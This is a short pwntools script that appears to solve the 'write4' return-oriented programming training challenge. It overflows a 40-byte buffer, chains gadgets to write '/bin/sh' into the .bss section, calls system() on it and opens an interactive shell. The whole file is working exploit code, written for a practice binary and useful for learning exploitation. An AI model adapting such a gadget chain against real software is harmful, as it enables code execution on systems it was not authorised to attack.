from pwn import *
p = process("./write4")

i = 0
while i < 4:
    print(p.recvline())
    i = i + 1

offset = "\x41" * 40
system = p64(0x4005e0)
mov_r15_r14 = p64(0x400820)
shstring = "/bin/sh\x00"
pop_r14_r15 = p64(0x400890)
bss = p64(0x601060)
pop_rdi = p64(0x400893)

rop = offset + pop_r14_r15 + bss + shstring + mov_r15_r14 + pop_rdi + bss + system

p.sendline(rop)
p.interactive()
